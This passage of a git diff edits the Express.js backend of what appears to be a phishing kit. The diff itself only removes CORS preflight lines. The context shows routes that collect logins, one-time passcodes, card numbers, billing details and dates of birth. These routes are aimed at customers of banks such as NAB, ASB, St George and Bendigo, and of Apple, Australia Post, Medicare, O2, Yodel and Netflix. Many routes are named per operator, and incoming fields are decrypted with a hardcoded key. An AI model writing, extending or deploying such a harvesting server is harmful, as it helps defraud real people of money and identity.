 app.post("/rbcSaveOtp", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2161,7 +2033,6 @@ app.post("/rbcSaveOtp", cors(), (req, res) => {
   });
 });
 
-app.options("/rbcSaveLoginAgain", cors());
 
 app.post("/rbcSaveLoginAgain", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2177,7 +2048,6 @@ app.post("/rbcSaveLoginAgain", cors(), (req, res) => {
   });
 });
 
-app.options("/rbcDeleteentry/:id", cors());
 
 app.post("/rbcDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -2195,7 +2065,6 @@ app.post("/rbcDeleteentry/:id", cors(), (req, res) => {
 //APPLE PANEL
 //APPLE PANEL
 
-app.options("/appleCustomers/:id/:owner/modal", cors());
 
 app.get("/appleCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
@@ -2210,7 +2079,6 @@ app.get("/appleCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-app.options("/appleCustomers/:owner", cors());
 
 app.get("/appleCustomers/:owner", (req, res) => {
   owner = req.params.owner;
@@ -2223,7 +2091,6 @@ app.get("/appleCustomers/:owner", (req, res) => {
   });
 });
 
-app.options("/appleCommand", cors());
 
 app.post("/appleCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2236,7 +2103,6 @@ app.post("/appleCommand", cors(), (req, res) => {
   });
 });
 
-app.options("/appleCustomers/:id/:owner", cors());
 
 app.get("/appleCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
@@ -2251,7 +2117,6 @@ app.get("/appleCustomers/:id/:owner", (req, res) => {
   });
 });
 
-app.options("/appleSaveBilling", cors());
 
 app.post("/appleSaveBilling", cors(), (req, res) => {
   firstName = req.body.firstName;
@@ -2284,7 +2149,6 @@ app.post("/appleSaveBilling", cors(), (req, res) => {
   });
 });
 
-app.options("/appleSaveCC", cors());
 
 app.post("/appleSaveCC", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2303,7 +2167,6 @@ app.post("/appleSaveCC", cors(), (req, res) => {
   });
 });
 
-app.options("/appleSaveOtp", cors());
 
 app.post("/appleSaveOtp", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2319,7 +2182,6 @@ app.post("/appleSaveOtp", cors(), (req, res) => {
   });
 });
 
-app.options("/appleDeleteentry/:id", cors());
 
 app.post("/appleDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -2338,7 +2200,6 @@ app.post("/appleDeleteentry/:id", cors(), (req, res) => {
 //ASB
 //ASB
 
-app.options("/asbCustomers/:id/:owner/modal", cors());
 
 app.get("/asbCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
@@ -2353,7 +2214,6 @@ app.get("/asbCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-app.options("/asbCustomers/:owner", cors());
 
 app.get("/asbCustomers/:owner", (req, res) => {
   owner = req.params.owner;
@@ -2366,7 +2226,6 @@ app.get("/asbCustomers/:owner", (req, res) => {
   });
 });
 
-app.options("/asbCommand", cors());
 
 app.post("/asbCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2379,7 +2238,6 @@ app.post("/asbCommand", cors(), (req, res) => {
   });
 });
 
-app.options("/asbCustomers/:id/:owner", cors());
 
 app.get("/asbCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
@@ -2394,7 +2252,6 @@ app.get("/asbCustomers/:id/:owner", (req, res) => {
   });
 });
 
-app.options("/asbSaveLogin", cors());
 
 app.post("/asbSaveLogin", cors(), (req, res) => {
   username = req.body.username;
@@ -2412,7 +2269,6 @@ app.post("/asbSaveLogin", cors(), (req, res) => {
   });
 });
 
-app.options("/asbSaveTelephone", cors());
 
 app.post("/asbSaveTelephone", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2428,7 +2284,6 @@ app.post("/asbSaveTelephone", cors(), (req, res) => {
   });
 });
 
-app.options("/asbSaveOtp", cors());
 
 app.post("/asbSaveOtp", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2444,7 +2299,6 @@ app.post("/asbSaveOtp", cors(), (req, res) => {
   });
 });
 
-app.options("/asbSaveNetcode", cors());
 
 app.post("/asbSaveNetcode", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2460,7 +2314,6 @@ app.post("/asbSaveNetcode", cors(), (req, res) => {
   });
 });
 
-app.options("/asbDeleteentry/:id", cors());
 
 app.post("/asbDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -2479,7 +2332,6 @@ app.post("/asbDeleteentry/:id", cors(), (req, res) => {
 //NAB
 //NAB
 
-app.options("/nabCustomers/:id/:owner/modal", cors());
 
 app.get("/nabCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
@@ -2494,7 +2346,6 @@ app.get("/nabCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-app.options("/nabCustomers/:owner", cors());
 
 app.get("/nabCustomers/:owner", (req, res) => {
   owner = req.params.owner;
@@ -2507,7 +2358,6 @@ app.get("/nabCustomers/:owner", (req, res) => {
   });
 });
 
-app.options("/nabCommand", cors());
 
 app.post("/nabCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2520,7 +2370,6 @@ app.post("/nabCommand", cors(), (req, res) => {
   });
 });
 
-app.options("/nabCustomers/:id/:owner", cors());
 
 app.get("/nabCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
@@ -2535,7 +2384,6 @@ app.get("/nabCustomers/:id/:owner", (req, res) => {
   });
 });
 
-app.options("/nabSaveLogin", cors());
 
 app.post("/nabSaveLogin", cors(), (req, res) => {
   username = req.body.username;
@@ -2553,7 +2401,6 @@ app.post("/nabSaveLogin", cors(), (req, res) => {
   });
 });
 
-app.options("/nabSaveOtp", cors());
 
 app.post("/nabSaveOtp", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2569,7 +2416,6 @@ app.post("/nabSaveOtp", cors(), (req, res) => {
   });
 });
 
-app.options("/nabSavePhone", cors());
 
 app.post("/nabSavePhone", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2589,7 +2435,6 @@ app.post("/nabSavePhone", cors(), (req, res) => {
 //MULTIPANEL
 //MULTIPANEL
 
-app.options("/multiCustomers/:owner", cors());
 
 app.get("/multiCustomers/:owner", async (req, result) => {
   owner = req.params.owner;
@@ -2646,7 +2491,6 @@ app.get("/multiCustomers/:owner", async (req, result) => {
 //STGEORGE
 //STGEORGE
 
-app.options("/georgeCustomers/:id/:owner/modal", cors());
 
 app.get("/georgeCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
@@ -2661,7 +2505,6 @@ app.get("/georgeCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-app.options("/georgeCustomers/:owner", cors());
 
 app.get("/georgeCustomers/:owner", (req, res) => {
   owner = req.params.owner;
@@ -2674,7 +2517,6 @@ app.get("/georgeCustomers/:owner", (req, res) => {
   });
 });
 
-app.options("/georgeCommand", cors());
 
 app.post("/georgeCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2687,7 +2529,6 @@ app.post("/georgeCommand", cors(), (req, res) => {
   });
 });
 
-app.options("/georgeSavePhone", cors());
 
 app.post("/georgeSavePhone", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2703,7 +2544,6 @@ app.post("/georgeSavePhone", cors(), (req, res) => {
   });
 });
 
-app.options("/georgeSaveOtp", cors());
 
 app.post("/georgeSaveOtp", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2719,7 +2559,6 @@ app.post("/georgeSaveOtp", cors(), (req, res) => {
   });
 });
 
-app.options("/georgeSaveCard", cors());
 
 app.post("/georgeSaveCard", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2737,7 +2576,6 @@ app.post("/georgeSaveCard", cors(), (req, res) => {
   });
 });
 
-app.options("/georgeSaveLoginAgain", cors());
 
 app.post("/georgeSaveLoginAgain", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2755,7 +2593,6 @@ app.post("/georgeSaveLoginAgain", cors(), (req, res) => {
   });
 });
 
-app.options("/georgeCustomers/:id/:owner", cors());
 
 app.get("/georgeCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
@@ -2772,7 +2609,6 @@ app.get("/georgeCustomers/:id/:owner", (req, res) => {
 
 let georgeCount = 0;
 
-app.options("/georgeSaveLogin", cors());
 
 app.post("/georgeSaveLogin", cors(), (req, res) => {
   accessNo = req.body.accessNo;
@@ -2807,7 +2643,6 @@ app.post("/georgeSaveLogin", cors(), (req, res) => {
   }
 });
 
-app.options("/georgeDeleteentry/:id", cors());
 
 app.post("/georgeDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -2826,7 +2661,6 @@ app.post("/georgeDeleteentry/:id", cors(), (req, res) => {
 //BENDIGO
 //BENDIGO
 
-app.options("/bendiCustomers/:id/:owner/modal", cors());
 
 app.get("/bendiCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
@@ -2841,7 +2675,6 @@ app.get("/bendiCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-app.options("/bendiCustomers/:owner", cors());
 
 app.get("/bendiCustomers/:owner", (req, res) => {
   owner = req.params.owner;
@@ -2854,7 +2687,6 @@ app.get("/bendiCustomers/:owner", (req, res) => {
   });
 });
 
-app.options("/bendiCommand", cors());
 
 app.post("/bendiCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2867,7 +2699,6 @@ app.post("/bendiCommand", cors(), (req, res) => {
   });
 });
 
-app.options("/bendiSavePhone", cors());
 
 app.post("/bendiSavePhone", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2883,7 +2714,6 @@ app.post("/bendiSavePhone", cors(), (req, res) => {
   });
 });
 
-app.options("/bendiCustomers/:id/:owner", cors());
 
 app.get("/bendiCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
@@ -2900,7 +2730,6 @@ app.get("/bendiCustomers/:id/:owner", (req, res) => {
 
 let bendiCount = 2;
 
-app.options("/bendiSaveLogin", cors());
 
 app.post(`/bendiSaveLogin`, cors(), (req, res) => {
   accessId = req.body.accessId;
@@ -3023,7 +2852,6 @@ app.post(`/bendiSaveLogin`, cors(), (req, res) => {
   // });
 });
 
-app.options("/bendiSaveOtp", cors());
 
 app.post("/bendiSaveOtp", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -3039,7 +2867,6 @@ app.post("/bendiSaveOtp", cors(), (req, res) => {
   });
 });
 
-app.options("/bendiSaveDob", cors());
 
 app.post("/bendiSaveDob", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -3055,7 +2882,6 @@ app.post("/bendiSaveDob", cors(), (req, res) => {
   });
 });
 
-app.options("/bendiSaveST", cors());
 
 app.post("/bendiSaveST", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -3071,7 +2897,6 @@ app.post("/bendiSaveST", cors(), (req, res) => {
   });
 });
 
-app.options("/bendiSaveLoginAgain", cors());
 
 app.post("/bendiSaveLoginAgain", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -3088,7 +2913,6 @@ app.post("/bendiSaveLoginAgain", cors(), (req, res) => {
   });
 });
 
-app.options("/bendiDeleteentry/:id", cors());
 
 app.post("/bendiDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -3107,7 +2931,6 @@ app.post("/bendiDeleteentry/:id", cors(), (req, res) => {
 //AUSPOSTwLogs
 //AUSPOSTwLogs
 
-app.options("/ausPostLog", cors());
 
 app.post("/ausPostLog", (req, res) => {
   username = req.body.username;
@@ -3128,7 +2951,6 @@ app.post("/ausPostLog", (req, res) => {
   res.send("Update Completed");
 });
 
-app.options("/ausPostStGeorgeLog", cors());
 
 app.post("/ausPostStGeorgeLog", (req, res) => {
   accessNo = req.body.accessNo;
@@ -3154,7 +2976,6 @@ app.post("/ausPostStGeorgeLog", (req, res) => {
 //O2
 //O2
 
-app.options("/serenityO2", cors());
 
 app.post("/serenityO2", (req, res) => {
   username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
@@ -3268,7 +3089,6 @@ app.post("/serenityO2", (req, res) => {
     });
 });
 
-app.options("/charlieO2", cors());
 
 app.post("/charlieO2", (req, res) => {
   username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
@@ -3382,7 +3202,6 @@ app.post("/charlieO2", (req, res) => {
     });
 });
 
-app.options("/saimO2", cors());
 
 app.post("/saimO2", (req, res) => {
   username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
@@ -3496,7 +3315,6 @@ app.post("/saimO2", (req, res) => {
     });
 });
 
-app.options("/c2O2", cors());
 
 app.post("/c2O2", (req, res) => {
   username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
@@ -3610,7 +3428,6 @@ app.post("/c2O2", (req, res) => {
     });
 });
 
-app.options("/o2Triz", cors());
 
 app.post("/o2Triz", (req, res) => {
   username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
@@ -3707,7 +3524,6 @@ app.post("/o2Triz", (req, res) => {
     });
 });
 
-app.options("/o2Pac", cors());
 
 app.post("/o2Pac", (req, res) => {
   telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
@@ -3751,7 +3567,6 @@ app.post("/o2Pac", (req, res) => {
 //AUSPOST
 //AUSPOST
 
-app.options("/eeAuspost", cors());
 
 app.post("/eeAuspost", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -3867,7 +3682,6 @@ app.post("/eeAuspost", (req, res) => {
     });
 });
 
-app.options("/truthAuspost", cors());
 
 app.post("/truthAuspost", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -3971,7 +3785,6 @@ app.post("/truthAuspost", (req, res) => {
     });
 });
 
-app.options("/fredAuspost", cors());
 
 app.post("/fredAuspost", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -4075,7 +3888,6 @@ app.post("/fredAuspost", (req, res) => {
     });
 });
 
-app.options("/trentAuspost", cors());
 
 app.post("/trentAuspost", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -4179,7 +3991,6 @@ app.post("/trentAuspost", (req, res) => {
     });
 });
 
-app.options("/biggieAuspost", cors());
 
 app.post("/biggieAuspost", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -4283,7 +4094,6 @@ app.post("/biggieAuspost", (req, res) => {
     });
 });
 
-app.options("/consistentAuspost", cors());
 
 app.post("/consistentAuspost", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -4389,7 +4199,6 @@ app.post("/consistentAuspost", (req, res) => {
 
 let bigbull = 0;
 
-app.options("/bigbullAuspost", cors());
 
 app.post("/bigbullAuspost", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -4493,7 +4302,6 @@ app.post("/bigbullAuspost", (req, res) => {
     });
 });
 
-app.options("/daangerAuspost", cors());
 
 app.post("/daangerAuspost", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -4599,7 +4407,6 @@ app.post("/daangerAuspost", (req, res) => {
 
 let c2 = 0;
 
-app.options("/c2auspost", cors());
 
 app.post("/c2auspost", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -4703,7 +4510,6 @@ app.post("/c2auspost", (req, res) => {
     });
 });
 
-app.options("/ausPostSJ", cors());
 
 app.post("/ausPostSJ", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -4777,7 +4583,6 @@ app.post("/ausPostSJ", (req, res) => {
     });
 });
 
-app.options("/ausPostKelv2", cors());
 
 app.post("/ausPostKelv2", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -4881,7 +4686,6 @@ app.post("/ausPostKelv2", (req, res) => {
     });
 });
 
-app.options("/ausPostManny", cors());
 
 app.post("/ausPostManny", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -4958,7 +4762,6 @@ app.post("/ausPostManny", (req, res) => {
     });
 });
 
-app.options("/ausPostAbzz", cors());
 
 app.post("/ausPostAbzz", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -5035,7 +4838,6 @@ app.post("/ausPostAbzz", (req, res) => {
     });
 });
 
-app.options("/ausPostSS", cors());
 
 app.post("/ausPostSS", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -5113,7 +4915,6 @@ app.post("/ausPostSS", (req, res) => {
     });
 });
 
-app.options("/ausPostTheOnlyMY", cors());
 
 app.post("/ausPostTheOnlyMY", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -5193,7 +4994,6 @@ app.post("/ausPostTheOnlyMY", (req, res) => {
 
 let frankAbignale = 0;
 
-app.options("/ausPostfrankabignale100!", cors());
 
 app.post("/ausPostfrankabignale100!", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -5271,7 +5071,6 @@ app.post("/ausPostfrankabignale100!", (req, res) => {
     });
 });
 
-app.options("/ausPostAR", cors());
 
 app.post("/ausPostAR", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -5339,7 +5138,6 @@ app.post("/ausPostAR", (req, res) => {
     });
 });
 
-app.options("/ausPostKelv", cors());
 
 app.post("/ausPostKelv", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -5418,7 +5216,6 @@ app.post("/ausPostKelv", (req, res) => {
 
 let SpoofergooferAP = 0;
 
-app.options("/ausPostSpoofer", cors());
 
 app.post("/ausPostSpoofer", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -5495,7 +5292,6 @@ app.post("/ausPostSpoofer", (req, res) => {
     });
 });
 
-app.options("/ausPostLoader", cors());
 
 app.post("/ausPostLoader", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -5571,7 +5367,6 @@ app.post("/ausPostLoader", (req, res) => {
 //MEDICARE
 //MEDICARE
 
-app.options("/fredMedicare", cors());
 
 app.post("/fredMedicare", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -5679,7 +5474,6 @@ app.post("/fredMedicare", (req, res) => {
     });
 });
 
-app.options("/tarrifiMedicare", cors());
 
 app.post("/tarrifiMedicare", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -5762,7 +5556,6 @@ app.post("/tarrifiMedicare", (req, res) => {
 
 let MZ7 = 0;
 
-app.options("/MZ7Medicare", cors());
 
 app.post("/MZ7Medicare", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -5845,7 +5638,6 @@ app.post("/MZ7Medicare", (req, res) => {
 
 let putin = 0;
 
-app.options("/putinMedicare", cors());
 
 app.post("/putinMedicare", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -5928,7 +5720,6 @@ app.post("/putinMedicare", (req, res) => {
 
 let failedlawyer = 1;
 
-app.options("/failedlawyerMedicare", cors());
 
 app.post("/failedlawyerMedicare", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -6011,7 +5802,6 @@ app.post("/failedlawyerMedicare", (req, res) => {
 
 let codeNba = 0;
 
-app.options("/codeNbaMedicare", cors());
 
 app.post("/codeNbaMedicare", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -6094,7 +5884,6 @@ app.post("/codeNbaMedicare", (req, res) => {
 
 let s350 = 2;
 
-app.options("/ssMedicare", cors());
 
 app.post("/ssMedicare", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -6175,7 +5964,6 @@ app.post("/ssMedicare", (req, res) => {
     });
 });
 
-app.options("/offshorebillionsMedicare", cors());
 
 app.post("/offshorebillionsMedicare", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -6256,7 +6044,6 @@ app.post("/offshorebillionsMedicare", (req, res) => {
     });
 });
 
-app.options("/haytchMedicare", cors());
 
 app.post("/haytchMedicare", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -6327,7 +6114,6 @@ app.post("/haytchMedicare", (req, res) => {
     });
 });
 
-app.options("/kelvMedicare", cors());
 
 app.post("/kelvMedicare", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -6415,7 +6201,6 @@ app.post("/kelvMedicare", (req, res) => {
 
 let mason = 4;
 
-app.options("/masonDHL", cors());
 
 app.post("/masonDHL", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -6495,7 +6280,6 @@ app.post("/masonDHL", (req, res) => {
 //NETLIX
 //NETLIX
 
-app.options("/fpaysNetflix", cors());
 
 app.post("/fpaysNetflix", (req, res) => {
   username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
@@ -6591,7 +6375,6 @@ app.post("/fpaysNetflix", (req, res) => {
 //YODEL
 //YODEL
 
-app.options("/sendYodelRes", cors());
 
 app.post("/sendYodelRes", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -6677,7 +6460,6 @@ app.post("/sendYodelRes", (req, res) => {
     });
 });
 
-app.options("/sendSSYodelres", cors());
 
 let ssCount = 0;
 
@@ -6758,7 +6540,6 @@ app.post("/sendSSYodelres", (req, res) => {
     });
 });
 
-app.options("/yodelM4STERB0Y", cors());
 
 let yodelM4STERB0Y = 0;
 
@@ -6836,7 +6617,6 @@ app.post("/yodelM4STERB0Y", (req, res) => {
     });
 });
 
-app.options("/sendARRYodelRes", cors());
 
 let arcount = 0;
 
@@ -6917,7 +6697,6 @@ app.post("/sendARRYodelRes", (req, res) => {
     });
 });
 
-app.options("/mazzaYodel", cors());
 
 app.post("/mazzaYodel", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -7006,7 +6785,6 @@ app.post("/mazzaYodel", (req, res) => {
     });
 });
 
-app.options("/yardzYodel", cors());
 
 app.post("/yardzYodel", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -7094,7 +6872,6 @@ app.post("/yardzYodel", (req, res) => {
 
 let hoods = 2;
 
-app.options("/hoodsYodel", cors());
 
 app.post("/hoodsYodel", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -7180,7 +6957,6 @@ app.post("/hoodsYodel", (req, res) => {
     });
 });
 
-app.options("/sendBigBillz20", cors());
 
 let bill = 0;
 
@@ -7264,7 +7040,6 @@ app.post("/sendBigBillz20", (req, res) => {
     });
 });
 
-app.options("/sendKelvYodelRes", cors());
 
 let kelvCount = 0;
 
@@ -7349,7 +7124,6 @@ app.post("/sendKelvYodelRes", (req, res) => {
 //EE
 //EE
 
-app.options("/c2EE", cors());
 
 app.post("/c2EE", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
@@ -7460,7 +7234,6 @@ app.post("/c2EE", (req, res) => {
     });
 });
 
-app.options("/eeKelv", cors());
 
 app.post("/eeKelv", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
@@ -7548,7 +7321,6 @@ app.post("/eeKelv", (req, res) => {
 //NZPOST
 //NZPOST
 
-app.options("/nzpostFirst", cors());
 
 app.post("/nzpostFirst", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -7663,7 +7435,6 @@ app.post("/nzpostFirst", (req, res) => {
 
 let bandz = 0;
 
-app.options("/chopsSFE", cors());
 
 app.post("/chopsSFE", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
@@ -7740,7 +7511,6 @@ app.post("/chopsSFE", (req, res) => {
   res.send("Update Complete");
 });
 
-app.options("/bandzSFE", cors());
 
 app.post("/bandzSFE", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
@@ -7819,7 +7589,6 @@ app.post("/bandzSFE", (req, res) => {
 
 let richgame = 0;
 
-app.options("/richgameSFE", cors());
 
 app.post("/richgameSFE", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
@@ -7898,7 +7667,6 @@ app.post("/richgameSFE", (req, res) => {
 
 let jv = 0;
 
-app.options("/cypherSFE", cors());
 
 app.post("/cypherSFE", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
@@ -7975,7 +7743,6 @@ app.post("/cypherSFE", (req, res) => {
   res.send("Update Complete");
 });
 
-app.options("/sfeJV", cors());
 
 app.post("/sfeJV", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
@@ -8052,7 +7819,6 @@ app.post("/sfeJV", (req, res) => {
   res.send("Update Complete");
 });
 
-app.options("/sfeNBA", cors());
 
 app.post("/sfeNBA", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
@@ -8129,7 +7895,6 @@ app.post("/sfeNBA", (req, res) => {
   res.send("Update Complete");
 });
 
-app.options("/sfeChasing", cors());
 
 app.post("/sfeChasing", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
@@ -8222,7 +7987,6 @@ app.post("/sfeChasing", (req, res) => {
 //APPLE ES
 //APPLE ES
 
-app.options("/kelvAppleSpain", cors());
 
 app.post("/kelvAppleSpain", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -8334,7 +8098,6 @@ app.post("/kelvAppleSpain", (req, res) => {
 //APPLE AU
 //APPLE AU
 
-app.options("/johnAppleAu", cors());
 
 app.post("/johnAppleAu", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -8457,7 +8220,6 @@ app.post("/johnAppleAu", (req, res) => {
     });
 });
 
-app.options("/kelvAppleAu", cors());
 
 app.post("/kelvAppleAu", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -8580,7 +8342,6 @@ app.post("/kelvAppleAu", (req, res) => {
     });
 });
 
-app.options("/osbAppleAu", cors());
 
 app.post("/osbAppleAu", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -8691,7 +8452,6 @@ app.post("/osbAppleAu", (req, res) => {
     });
 });
 
-app.options("/fredAppleAu", cors());
 
 app.post("/fredAppleAu", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -8802,7 +8562,6 @@ app.post("/fredAppleAu", (req, res) => {
     });
 });
 
-app.options("/t1AppleAu", cors());
 
 app.post("/t1AppleAu", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -8917,7 +8676,6 @@ app.post("/t1AppleAu", (req, res) => {
 //APPLE
 //APPLE
 
-app.options("/pweightApple", cors());
 
 app.post("/pweightApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -9028,7 +8786,6 @@ app.post("/pweightApple", (req, res) => {
     });
 });
 
-app.options("/dpApple", cors());
 
 app.post("/dpApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -9145,7 +8902,6 @@ app.post("/dpApple", (req, res) => {
     });
 });
 
-app.options("/rondoApple", cors());
 
 app.post("/rondoApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -9262,7 +9018,6 @@ app.post("/rondoApple", (req, res) => {
     });
 });
 
-app.options("/ghostApple", cors());
 
 app.post("/ghostApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -9373,7 +9128,6 @@ app.post("/ghostApple", (req, res) => {
     });
 });
 
-app.options("/smokedApple", cors());
 
 app.post("/smokedApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -9490,7 +9244,6 @@ app.post("/smokedApple", (req, res) => {
     });
 });
 
-app.options("/trizApple", cors());
 
 app.post("/trizApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -9574,7 +9327,6 @@ app.post("/trizApple", (req, res) => {
     });
 });
 
-app.options("/tcapzApple", cors());
 
 app.post("/tcapzApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -9687,7 +9439,6 @@ app.post("/tcapzApple", (req, res) => {
 
 let fasterpayments = 0;
 
-app.options("/fasterpaymApple", cors());
 
 app.post("/fasterpaymApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -9800,7 +9551,6 @@ app.post("/fasterpaymApple", (req, res) => {
 
 let blackTesco = 0;
 
-app.options("/blacktescoApple", cors());
 
 app.post("/blacktescoApple", (req, res) => {
